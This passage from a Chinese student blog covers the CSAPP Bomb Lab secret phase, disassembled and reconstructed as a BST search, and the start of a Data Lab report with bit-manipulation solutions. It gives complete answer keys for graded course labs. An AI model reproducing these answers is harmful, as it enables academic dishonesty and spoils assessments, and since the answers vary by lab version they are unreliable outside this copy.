              <span class="keyword">jne</span>    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401617</span>:       bf f8 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4024f8,%edi</span><br><span class="line">  40161c:       e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">401621</span>:       bf <span class="number">20</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402520,%edi</span><br><span class="line">  <span class="number">401626</span>:       e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401630</span>:       e8 <span class="number">0d</span> fc ff ff          callq  <span class="number">401242</span> &lt;secret_phase&gt;</span><br><span class="line">  # 然后才能进入隐藏阶段</span><br><span class="line">  <span class="number">401635</span>:       bf <span class="number">58</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402558,%edi</span><br><span class="line">  40163a:       e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:       <span class="number">48</span> 8b <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>          <span class="keyword">mov</span>    <span class="number">0x68</span>(%rsp),%rax</span><br><span class="line">  <span class="number">401644</span>:       <span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  40164b:       <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">40164d</span>:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">401654</span> &lt;phase_defused+<span class="number">0x90</span>&gt;</span><br><span class="line">  40164f:       e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  <span class="number">401654</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">78</span>             <span class="keyword">add</span>    <span class="number">$0</span>x78,%rsp</span><br><span class="line">  <span class="number">401658</span>:       c3                      retq   </span><br></pre></td></tr></table></figure><br>当且仅当phase_6解除并且从phase_4的输入字符串依次读取两个数字和一个字符串且这个字符串为”DrEvil”时，可以进入。</p>
<p>在bomb-disassemble中观察secret_phase的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401242</span> &lt;secret_phase&gt;:</span><br><span class="line">  <span class="number">401242</span>:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">401243</span>:       e8 <span class="number">56</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  <span class="number">401248</span>:       ba 0a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xa,%edx</span><br><span class="line">  <span class="number">40124d</span>:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line">  <span class="number">401252</span>:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">401255</span>:       e8 <span class="number">76</span> f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  # 调用strtol函数</span><br><span class="line">  40125a:       <span class="number">48</span> <span class="number">89</span> c3                <span class="keyword">mov</span>    %rax,%rbx</span><br><span class="line">  <span class="number">40125d</span>:       <span class="number">8d</span> <span class="number">40</span> ff                <span class="keyword">lea</span>    -<span class="number">0x1</span>(%rax),%eax</span><br><span class="line">  <span class="number">401260</span>:       <span class="number">3d</span> e8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">cmp</span>    <span class="number">$0</span>x3e8,%eax</span><br><span class="line">  <span class="number">401265</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    40126c &lt;secret_phase+<span class="number">0x2a</span>&gt;</span><br><span class="line">  <span class="number">401267</span>:       e8 ce <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 如果数字减<span class="number">1</span>之后大于<span class="number">1000</span> 则引爆bomb</span><br><span class="line">  40126c:       <span class="number">89</span> de                   <span class="keyword">mov</span>    %ebx,%esi</span><br><span class="line">  40126e:       bf f0 <span class="number">30</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6030f0,%edi</span><br><span class="line">  <span class="number">401273</span>:       e8 8c ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  # 调用fun7</span><br><span class="line">  <span class="number">401278</span>:       <span class="number">83</span> f8 <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</span><br><span class="line">  40127b:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">401282</span> &lt;secret_phase+<span class="number">0x40</span>&gt;</span><br><span class="line">  <span class="number">40127d</span>:       e8 b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 如果fun7返回值不为<span class="number">2</span> 则引爆bomb</span><br><span class="line">  <span class="number">401282</span>:       bf <span class="number">38</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402438,%edi</span><br><span class="line">  <span class="number">401287</span>:       e8 <span class="number">84</span> f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:       e8 <span class="number">33</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">401291</span>:       5b                      <span class="keyword">pop</span>    %rbx</span><br><span class="line">  <span class="number">401292</span>:       c3                      retq   </span><br></pre></td></tr></table></figure><br>根据反汇编的结果，我们可以得知，secret_phase同样需要读入一个字符串，之后其首先调用strtol(input, NULL, 10)将输入的字符串转换成long型数字a。</p>
<p>如果该数字&gt;1001，则引爆bomb，否则则调用fun7(0x6030f0, a)并判断其返回结果，当且仅当结果为2时，解除secret_phase。</p>
<p>在bomb-disassemble中观察fun7的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401204</span> &lt;fun7&gt;:</span><br><span class="line">  <span class="number">401204</span>:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  <span class="number">401208</span>:       <span class="number">48</span> <span class="number">85</span> ff                <span class="keyword">test</span>   %rdi,%rdi</span><br><span class="line">  40120b:       <span class="number">74</span> 2b                   <span class="keyword">je</span>     <span class="number">401238</span> &lt;fun7+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">40120d</span>:       8b <span class="number">17</span>                   <span class="keyword">mov</span>    (%rdi),%edx</span><br><span class="line">  40120f:       <span class="number">39</span> f2                   <span class="keyword">cmp</span>    %esi,%edx</span><br><span class="line">  <span class="number">401211</span>:       7e <span class="number">0d</span>                   <span class="keyword">jle</span>    <span class="number">401220</span> &lt;fun7+<span class="number">0x1c</span>&gt;</span><br><span class="line">  <span class="number">401213</span>:       <span class="number">48</span> 8b 7f <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">401217</span>:       e8 e8 ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  40121c:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  40121e:       eb <span class="number">1d</span>                   <span class="keyword">jmp</span>    <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401220</span>:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401225</span>:       <span class="number">39</span> f2                   <span class="keyword">cmp</span>    %esi,%edx</span><br><span class="line">  <span class="number">401227</span>:       <span class="number">74</span> <span class="number">14</span>                   <span class="keyword">je</span>     <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401229</span>:       <span class="number">48</span> 8b 7f <span class="number">10</span>             <span class="keyword">mov</span>    <span class="number">0x10</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">40122d</span>:       e8 d2 ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">401232</span>:       <span class="number">8d</span> <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>             <span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401236</span>:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401238</span>:       b8 ff ff ff ff          <span class="keyword">mov</span>    <span class="number">$0</span>xffffffff,%eax</span><br><span class="line">  <span class="number">40123d</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  <span class="number">401241</span>:       c3                      retq   </span><br><span class="line">  # 同样是递归的二分查找过程 数据结构是BST二叉搜索树</span><br></pre></td></tr></table></figure><br>将fun7逆向，结果如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tree</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(struct tree * ptr, <span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (ptr-&gt;val == num) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ptr-&gt;val &lt; num) &#123;</span><br><span class="line">		ptr = ptr-&gt;right;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span> * fun7(ptr, num) + <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ptr = ptr-&gt;left;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span> * fun7(ptr, num);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;		 </span><br></pre></td></tr></table></figure><br>其中，ptr所指向的struct tree是一棵二叉搜索树的根节点。对于二叉搜索树的任意一个节点，节点左边孩子的值全部小于该节点的值，节点右边孩子的值全部大于该节点的值。</p>
<p>这棵根节点位于0x6030f0的二叉搜索树的结构如下图所示：<br><div class="figure " style="width:;"><img class="fig-img" src="BST.png" alt=""></div></p>
<p>要令fun7返回的结果为2，一种可行的递归返回情况是0-&gt;(2<em>0+1)=1-&gt;(1</em>2)=2。在该情况下，递归深度为2，节点的移动路线为左-&gt;右，并且在值为22的节点返回0。这表明，fun7的第二个参数，也就是secret_phase的正确答案，为”22”。</p>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><blockquote>
<p>注意，有部分答案不唯一，并且Bomb Lab每年都在更新，所以答案可能会有所变化。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">1 311</span><br><span class="line">0 0 DrEvil</span><br><span class="line">yo~uvw</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br></pre></td></tr></table></figure>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/04/18/深入理解计算机系统BombLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/04/04/深入理解计算机系统DataLab实验报告/">
                            深入理解计算机系统DataLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-04-04T16:50:20+08:00">
	
		    4月 04, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/DataLab" target="_blank" rel="noopener">GitHub</a>上</p>
<blockquote>
<p>总共花了五天时间完成了《深入理解计算机系统》(Computer Science A Programmer’s Perspective)的第一个Lab - Data Lab，深感这次实验的效率低下。一方面是由于清明假期自己有所惰怠，另一方面也是由于在做题的时候采取了不正确的方法，在已经明知不会的情况下我还继续投入大量无意义的时间，没有取得很好的学习效果。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Data Lab - Manipulating Bits主要是关于位操作的实验，对应于书本的第2章：信息的表示和处理。</p>
<p>在该实验中，学生主要需要在一个严格限制的C子集（使用优先的位运算符以及顺序结构的代码）中实现简单的逻辑，补码以及浮点数相关的函数。本实验的目的是为了让学生熟悉整数和浮点数的位级表示。</p>
<p>本实验的核心在于在各种受限制的条件下完成给出的15个谜题。其中包括5个位操作的谜题，7个补码运算的谜题，以及3个浮点数操作的谜题。其中每完成一个谜题都能得到一定的分数，如果使用的运算符数目小于给定的数目，还能获得加分。本实验的满分是71分。可以通过讲义中的driver.pl脚本直接计算出总分数。</p>
<p>关于本实验具体的介绍详见<a href="http://csapp.cs.cmu.edu/3e/datalab-handout.tar" target="_blank" rel="noopener">实验讲义</a>。</p>
<h2 id="测试程序btest-make失败及解决办法"><a href="#测试程序btest-make失败及解决办法" class="headerlink" title="测试程序btest make失败及解决办法"></a>测试程序btest make失败及解决办法</h2><p>在完成实验的功能中需要用到<code>make &amp;&amp; ./btest</code>命令进行答案正确性的检查，结果系统返回了<code>fetal error: gnu/stubs-32.h:No such file or directory</code>。</p>
<p>经过检查发现是系统是Archlinux 64位，而Makefile中包含了-m32的编译参数导致的。</p>
<p>通过启用multilib仓库使得可以在64位的ArchLinux系统上编译和运行32位的程序，问题得以解决。</p>
<p>编辑/etc/pacman.conf，取消下面内容的注释：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[multilib]</span><br><span class="line">include = /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<p>更新软件包列表并升级系统<code>pacman -Syu</code></p>
<p>然后安装gcc-multilib并重新执行<code>make &amp;&amp; ./btest</code>，问题解决。</p>
<h2 id="实验限制"><a href="#实验限制" class="headerlink" title="实验限制"></a>实验限制</h2><h3 id="整数代码规则"><a href="#整数代码规则" class="headerlink" title="整数代码规则"></a>整数代码规则</h3><p>整数代码应遵循如下的基本结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Funct</span><span class="params">(arg1, arg2, ...)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">    <span class="keyword">int</span> var1 = Expr1;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">int</span> varM = ExprM;</span><br><span class="line">    varJ = ExprJ;</span><br><span class="line">    ...</span><br><span class="line">    varN = ExprN;</span><br><span class="line">    <span class="keyword">return</span> ExprR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每一个表达式只能使用：</p>
<ol>
<li>0～255之间的常量（包括0和255）</li>
<li>函数的参数和局部变量</li>
<li>单目运算符 ! ~</li>
<li>双目运算符 &amp; ^ | + &lt;&lt; &gt;&gt;</li>
</ol>
<p>注意，部分题目对于运算符有着更加严格的限制，但是你可以在一行代码中使用多个运算符。</p>
<p>你将会被禁止：</p>
<ol>
<li>使用任何的分支或者循环结构</li>
<li>定义或者使用任何的宏</li>
<li>在文件中定义任何额外函数</li>
<li>调用任何函数</li>
<li>使用任何其他的运算符</li>
<li>使用任何形式的类型转换</li>
<li>使用除了int以外的其他数据类型，这意味着你不能使用数组，结构或联合</li>
</ol>
<p>你可以假设你的机器：</p>
<ol>
<li>使用32位补码表示整数</li>
<li>使用算术右移</li>
<li>对整数进行的位移运算的位数超越了字长是未定义的行为</li>
</ol>
<h3 id="浮点代码规则"><a href="#浮点代码规则" class="headerlink" title="浮点代码规则"></a>浮点代码规则</h3><p>浮点运算的规则相对较为宽松，你可以使用循环或者是分支结构，你被允许同时使用int和unsigned，此外，你还可以使用任意的常量。</p>
<p>你将会被禁止：</p>
<ol>
<li>定义或者使用任何的宏</li>
<li>在文件中定义任何额外函数</li>
<li>调用任何函数</li>
<li>使用任何形式的类型转换</li>
<li>使用除了int和unsigned以外的任何数据类型，这意味着你不能使用数组，结构或者联合</li>
<li>使用任何浮点数的数据类型，操作或者是常量</li>
</ol>
<h2 id="实验答案及分析"><a href="#实验答案及分析" class="headerlink" title="实验答案及分析"></a>实验答案及分析</h2><h3 id="第一部分-位操作"><a href="#第一部分-位操作" class="headerlink" title="第一部分 位操作"></a>第一部分 位操作</h3><ul>
<li><p>bitAnd<br>  问题：要求使用~和|以及不超过8个操作符实现x&amp;y<br>  分析：使用De Morgan定律即可<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* x&amp;y = ~(~(x&amp;y)) = ~(~x|~y) */</span></span><br><span class="line">	<span class="keyword">return</span> ~(~x | ~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>getByte<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过6个操作符返回x中的第n个字节(0(LSB)&lt;=n&lt;=3(MSB))。<br>  分析：根据不同的n值将x右移不同的位数，然后使用掩码0xFF取得最低位数的字节即可。先左移再右移会导致算术右移，需要小心。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* right shift in order to avoid boring arithmatic shift and try to get specific byte using bitAnd and mask. */</span></span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; (n &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span>);		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>logicalShift<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过20个操作符实现将int值x的逻辑右移n位。<br>  分析：通过将一个全1的数通过算术右移的方式构造掩码，然后与算术右移的掩码求按位与即可。<br>  注意，直接右移32位的结果是未定义的，需要额外处理这种情况。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* try to implement logical right shift by mask and logical right shift */</span></span><br><span class="line">    <span class="keyword">int</span> mask = ((~<span class="number">0</span>) &lt;&lt; (<span class="number">31</span> + (~n + <span class="number">1</span>))) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; (~mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>bitCount<br>   问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过40个操作符计算一个数字x中有多少为1的位。<br>   分析：<br>   本题参考<a href="http://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators" target="_blank" rel="noopener">stackoverflow</a>上的回答，并结合题目要求做了一些改动。<br>   核心的思想是分治法，通过将原数字x中的位按每1,2,4…个位分组，按相邻组进行累加，最后求出结果。<br>   举例来说，假如现在有一个数395，它的二进制表示是0000000110001011(16位)，首先我们将这个数按1位分组，得到：<br>   0 0 0 0 0 0 0 1 1 0 0 0 1 0 1 1<br>   然后我们将相邻的组累加，得到：<br>   0+0 0+0 0+0 0+1 1+0 0+0 1+0 1+1<br>   00 00 00 01 01 00 01 10<br>   然后我们继续将相邻的组累加，得到：<br>   00+00 00+01 01+00 01+10<br>   0000 0001 0001 0011<br>   然后我们继续将相邻的组累加，得到：<br>   0000+0001 0001+0011<br>   00000001 00000100<br>   最后，我们最后的两个组累加，得到：<br>   00000001+0000100=00000101<br>   结果是5，为正确答案。<br>   答案：</p>
   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* Divide and Conquer */</span></span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">0x55</span> + (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0x55</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0x55</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">1</span>) &amp; mask);</span><br><span class="line">    mask = <span class="number">0x33</span> + (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0x33</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0x33</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">2</span>) &amp; mask);</span><br><span class="line">    mask = <span class="number">0xF</span> + (<span class="number">0xF</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0xF</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0xF</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">4</span>) &amp; mask);</span><br><span class="line">    <span class="keyword">return</span> (x + (x &gt;&gt; <span class="number">8</span>) + (x &gt;&gt; <span class="number">16</span>) + (x &gt;&gt; <span class="number">24</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>bang<br>  问题：要求使用~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过12个操作数计算x的逻辑非。<br>  分析：<br>  逻辑非要求将0变成1，将非0的数变成0。生成0或1可以通过与掩码0x1求按位与实现，重点在于如何构造一个表达式使得0和非0的数产生不同的结果。<br>  可以考虑对于任意一个非0的数，它的负数都是从最高位到其最低位的1为止(不包括最低位的1)全部取反的结果。<br>  例如，14是00001110(8位)，而-14是11110010(8位)，为14从最高位到最低位的1(不包括这个1)，也就是000011取反，而最低位的10不变的结果。<br>  而0的负数永远是0。<br>  从这里我们可以看出，对于一个非0的数，它与它的负数按位或的结果的最高位一定会是1，而0与非0的按位或的结果的最高位永远是0。我们可以以此实现逻辑非。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* for x != 0, the highest bit of x | (-x) will always become 1 while when x == 0, the result is the opposite */</span></span><br><span class="line">	<span class="keyword">return</span> (~((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="第二部分-补码运算"><a href="#第二部分-补码运算" class="headerlink" title="第二部分 补码运算"></a>第二部分 补码运算</h3><ul>
<li><p>tmin<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过4个运算符返回以补码表示的最小的整数。<br>  分析：根据补码到整数的公式，最小的整数的补码表示为10000…<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* TMin = 10000.... */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>fitsBits<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过15个操作符判断x是否能表示成n位的补码，如果是，则返回1，反之则返回0。<br>  分析：<br>  这个问题需要分正数和负数两种情况讨论，对于正数来说，如果一个数x能表示成n位的补码，那么它从最高位直到第n位一定全部为0，它的第n位一定不能为1，否则它就会变成一个负数。对于一个负数来说，如果一个数x能表示成n位的补码，那么它只需从最高位到第n位全部为1即可。<br>  因此，我们可以先将x右移n-1位，对于满足条件的正数和负数，这将产生一个全0的数或是一个全1的数。然后我们可以根据x的符号构造一个全0或者是全1的掩码。通过将这两个数按位异或并且取逻辑非，就能得到正确的结果。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* if fitsBits then from highest bit to n bit will all become 1 - negative number or 0 - positive number</span></span><br><span class="line"><span class="comment"> * then can construct a mask to implement fitsBits with the help of ^ and !</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">return</span> !((x &gt;&gt; (n + (~<span class="number">1</span>) + <span class="number">1</span>)) ^ (((<span class="number">1</span> 